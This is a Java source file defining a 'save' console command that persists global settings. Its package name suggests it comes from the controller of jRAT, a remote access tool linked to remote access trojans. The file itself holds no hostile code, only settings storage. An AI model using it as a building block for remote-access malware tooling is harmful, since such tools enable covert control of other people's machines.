package io.jrat.controller.commands;

import io.jrat.controller.settings.AbstractStorable;
import io.jrat.controller.settings.Settings;
import java.io.PrintStream;
import jrat.api.commands.AbstractCommand;

public class CommandSave extends AbstractCommand {

	@Override
	public void process(String[] args, PrintStream out) throws Exception {
		System.out.println("Saving settings...");
		
		AbstractStorable.saveAllGlobals();

		try {
			Settings.getGlobal().save();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public String getDescription() {
		return "Saves all settings";
	}

	@Override
	public String getExample() {
		return "save";
	}

	@Override
	public String getUsage() {
		return "save";
	}

}
